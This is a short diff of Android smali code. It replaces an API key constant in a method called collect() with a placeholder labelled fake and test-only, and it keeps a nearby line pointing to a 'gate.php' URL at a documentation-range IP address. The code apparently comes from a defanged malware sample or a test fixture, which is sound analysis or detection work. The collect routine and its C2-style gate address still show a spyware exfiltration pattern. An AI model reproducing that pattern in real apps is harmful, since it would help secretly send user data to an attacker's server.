@@ -16,7 +16,7 @@
 .method public static collect()V
     .registers 11
 
-    const-string v0, "AIzaSyB1cD3fG5hJ7kL9mN1pQ3rS5tU7vW9xY0z"
+    const-string v0, "AIzaSyFAKE0TESTONLY0DO0NOT0USE000000000"
 
     const-string v1, "http://198.51.100.23/gate.php"
 
